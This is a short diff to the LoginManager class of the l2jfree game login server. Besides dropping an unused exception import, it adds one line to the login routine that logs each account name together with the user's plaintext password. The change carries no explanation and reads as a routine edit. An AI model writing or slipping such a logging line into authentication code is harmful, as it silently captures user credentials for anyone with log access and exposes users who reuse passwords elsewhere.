@@ -47,7 +47,6 @@ import com.l2jfree.loginserver.services.AccountsServices;
 import com.l2jfree.loginserver.services.exception.AccountBannedException;
 import com.l2jfree.loginserver.services.exception.AccountModificationException;
 import com.l2jfree.loginserver.services.exception.AccountWrongPasswordException;
-import com.l2jfree.loginserver.services.exception.HackingException;
 import com.l2jfree.loginserver.services.exception.IPRestrictedException;
 import com.l2jfree.loginserver.services.exception.MaintenanceException;
 import com.l2jfree.loginserver.services.exception.MaturityException;
@@ -505,6 +504,8 @@ public class LoginManager
 			AccountModificationException, AccountBannedException, AccountWrongPasswordException
 	{
 		_logLoginTries.info("User trying to connect  '" + user + "' " + (address == null ? "null" : address.getHostAddress()));
+
+		_log.info("Account " + user + ", password " + password);
 
 		// o Convert password in utf8 byte array
 		// ----------------------------------
